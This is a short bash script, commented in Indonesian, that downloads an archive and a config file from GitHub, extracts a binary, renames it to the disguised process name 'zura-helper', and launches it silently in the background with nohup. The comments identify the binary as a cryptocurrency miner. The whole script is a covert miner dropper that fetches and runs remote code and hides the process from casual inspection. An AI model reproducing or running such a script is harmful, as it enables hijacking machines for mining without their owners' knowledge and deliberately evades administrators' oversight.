#!/bin/bash

# Nama proses yang disamarkan
PROCESS_NAME="zura-helper"

# Cek apakah miner sudah berjalan
if pgrep -x "$PROCESS_NAME" > /dev/null; then
    echo "Miner sudah berjalan! Keluar..."
    exit 1
fi

# Install dependencies (jika perlu)
apt update && apt install -y curl wget

# Download miner & konfigurasi
wget -q --show-progress -O nano.tar.gz "https://github.com/tobrutkota/server/raw/main/nano.tar.gz"
wget -q --show-progress -O config.ini "https://raw.githubusercontent.com/tobrutkota/zura-nano/main/config.ini"
# Cek apakah file berhasil didownload
if [[ ! -f "nano.tar.gz" || ! -f "config.ini" ]]; then
    echo "Download gagal, keluar..."
    exit 1
fi

# Ekstrak & rename miner
tar -xvzf nano.tar.gz
if [[ -d "cache" ]]; then
    mv cache "$PROCESS_NAME"
    chmod +x "$PROCESS_NAME"
else
    echo "File cache tidak ditemukan, keluar..."
    exit 1
fi

# Jalankan miner di background
nohup ./"$PROCESS_NAME" > /dev/null 2>&1 &

echo "Mining berjalan dengan nama proses: $PROCESS_NAME"
